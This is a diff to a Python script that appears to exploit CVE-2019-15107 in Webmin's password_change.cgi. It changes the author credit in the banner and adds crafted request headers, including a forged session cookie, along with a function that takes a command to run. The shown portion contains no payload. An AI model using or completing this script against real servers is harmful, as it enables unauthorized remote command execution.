@@ -16,12 +16,28 @@ banner ='''
 | (____/\  \   /  | (____/\     (   (__/\|  (__) |__) (_/\____) )    __) (_/\____) )__) (_|  (__) | /  /    
 (_______/   \_/   (_______/_____\_______/(_______)\____/\______/_____\____/\______/ \____/(_______) \_/     
                           (_____)                              (_____)                                      
-                                     python By jas502n
+                                     python By merlin-ke
+				     special mention to jas502n
 
 '''
 print banner
 
+headers = {
+    'Accept-Encoding': "gzip, deflate",
+    'Accept': "*/*",
+    'Accept-Language': "en",
+    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
+    'Connection': "close",
+    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
+    'Referer': "%s/session_login.cgi"%url,
+    'Content-Type': "application/x-www-form-urlencoded",
+    'Content-Length': "60",
+    'cache-control': "no-cache"
+    }
+vuln_url = url + "/password_change.cgi"
 
+##Check for vulnerabilities
+## If not vuln, exceed, if vulnm give 2 options,
 
 def CVE_2019_15107(url, cmd):
     vuln_url = url + "/password_change.cgi"
